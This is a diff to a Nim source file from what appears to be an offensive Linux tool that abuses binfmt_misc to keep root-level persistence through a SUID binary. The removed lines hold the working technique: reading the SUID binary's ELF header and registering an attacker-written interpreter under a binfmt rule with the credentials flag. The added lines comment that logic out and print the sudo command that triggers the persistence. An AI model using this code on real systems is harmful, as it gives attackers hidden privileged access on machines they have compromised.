@@ -108,33 +108,35 @@ proc exploit(registerPath, suidPath, interpreter: string): void=
   ## - create interpreter
   ## - register the interpreter
   
-  # read header of suid file(for magic_number)
-  let stream = newFileStream(suidPath, mode = fmRead)
-  defer: stream.close()
-  # Check magic string
-  var magicNumber: array[HEADER_SIZE, char]
-  discard stream.readData(magicNumber.addr, HEADER_SIZE) 
-  if magicNumber != ELF_HEADER:
-    styledEcho("❌ SUID file, ",suidPath,fgRed," is not an ELF binary")
-    quit(QuitSuccess)
+  # # read header of suid file(for magic_number)
+  # let stream = newFileStream(suidPath, mode = fmRead)
+  # defer: stream.close()
+  # # Check magic string
+  # var magicNumber: array[HEADER_SIZE, char]
+  # discard stream.readData(magicNumber.addr, HEADER_SIZE) 
+  # if magicNumber != ELF_HEADER:
+  #   styledEcho("❌ SUID file, ",suidPath,fgRed," is not an ELF binary")
+  #   quit(QuitSuccess)
 
-  # retrieve interpreter (from now it is done at compilation time)
-  # write interpreter in fs
-  writeFile(INTERPRETER_PATH, interpreter)
-  setFilePermissions(INTERPRETER_PATH, {fpUserWrite, fpUserRead, fpUserExec})
-  # register interpreter
-  stream.setPosition(0)
-  var headerSuidHex,registerLine: string
-  for i in 1..128:
-    headerSuidHex &= "\\x"&toHex($(stream.readChar()))
-  registerLine= ":$1:M::$2::$3:C" % [RULE_NAME, headerSuidHex, INTERPRETER_PATH]
-  writeFile(BINFMT_DIR & RULE_NAME, "1")
-  writeFile(registerPath, registerLine)
+  # # retrieve interpreter (from now it is done at compilation time)
+  # # write interpreter in fs
+  # writeFile(INTERPRETER_PATH, interpreter)
+  # setFilePermissions(INTERPRETER_PATH, {fpUserWrite, fpUserRead, fpUserExec})
+  # # register interpreter
+  # stream.setPosition(0)
+  # var headerSuidHex,registerLine: string
+  # for i in 1..128:
+  #   headerSuidHex &= "\\x"&toHex($(stream.readChar()))
+  # registerLine= ":$1:M::$2::$3:C" % [RULE_NAME, headerSuidHex, INTERPRETER_PATH]
+  # writeFile(BINFMT_DIR & RULE_NAME, "1")
+  # writeFile(registerPath, registerLine)
   
 
   # BOOM!
-  echo("\n🌒  binfmt has been exploited to maintain privileged persistence.")
-  echo "\e[2mWelcome in the shadow\e[0m"
+  echo("🌒  binfmt has been exploited to maintain privileged persistence.")
+  echo "\e[2mWelcome in the shadow. Command that will trigger the persistence command:"
+  styledEcho("😈 Command that will trigger the persistence command ", bgRed, "sudo ", suidPath, fgBlack)
+
 
 proc shuid(
   privesc = false, 
